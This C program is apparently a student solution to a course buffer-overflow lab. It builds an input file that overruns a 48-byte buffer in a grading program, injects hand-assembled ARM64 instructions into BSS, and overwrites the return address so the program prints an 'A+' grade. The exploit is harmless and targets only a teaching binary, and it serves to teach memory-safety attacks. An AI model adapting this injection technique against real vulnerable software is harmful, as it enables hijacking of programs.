/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Authors: Byron Zhang & Nicholas Padmanabhan                        */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "miniassembler.h"

/*
    Takes no command-line or function arguments and does not read from
    any input stream. Writes to a file stream, creating a text file
    called dataAplus. Returns EXIT_SUCCESS.
*/
int main(int argc, char const *argv[]) {
    const char *name = "Nick Zhang";
    const size_t BUFSIZE = 48;
    const size_t CHAR_FMT_STR_SIZE = 4;
    const size_t INSTR_SIZE = 28 + CHAR_FMT_STR_SIZE;
    FILE *psFile;
    size_t i;

    /* 0x420058 is the address of the start of BSS; ulData is the
    address of the first adr instruction */
    unsigned long ulData = 0x420058 + BUFSIZE - INSTR_SIZE;

    /* adr w0, ("%c") */
    unsigned int adr1 = MiniAssembler_adr(
        0, ulData + INSTR_SIZE - CHAR_FMT_STR_SIZE, ulData);

    /* mov w1, 'A' */
    unsigned int mov1 = MiniAssembler_mov(1, 'A');

    /* bl printf */
    unsigned int bl = MiniAssembler_bl(0x400600, ulData + 8);

    /* mov w0, '+' */
    unsigned int mov2 = MiniAssembler_mov(0, '+');

    /* adr x1, grade */
    unsigned int adr2 = MiniAssembler_adr(1, 0x420044, ulData + 16);

    /* strb w0, [x1] */
    unsigned int strb = MiniAssembler_strb(0, 1);

    /* b (printf in main) */
    unsigned int b = MiniAssembler_b(0x400864, ulData + 24);

    /* Creates empty dataAplus text file */
    psFile = fopen("dataAplus", "w");

    /* Writes each char from *name into psFile */
    for (i = 0; i < strlen(name); i++) putc(name[i], psFile);

    /* Writes null bytes until there are BUFSIZE - INSTR_SIZE bytes in
       psFile to leave INSTR_SIZE bytes for the instructions and the
       char format string */
    for (i = strlen(name); i < BUFSIZE - INSTR_SIZE; i++)
        putc(0, psFile);

    /* Writes the seven injected BSS instructions */
    fwrite(&adr1, sizeof(unsigned int), 1, psFile);
    fwrite(&mov1, sizeof(unsigned int), 1, psFile);
    fwrite(&bl, sizeof(unsigned int), 1, psFile);
    fwrite(&mov2, sizeof(unsigned int), 1, psFile);
    fwrite(&adr2, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* Writes the char format string "%c" and a final null byte */
    putc('%', psFile);
    putc('c', psFile);
    putc(0, psFile);
    putc(0, psFile);

    /* Writes the address of the first injected instruction in BSS */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);

    /* Closes the dataAplus text file */
    fclose(psFile);

    return EXIT_SUCCESS;
}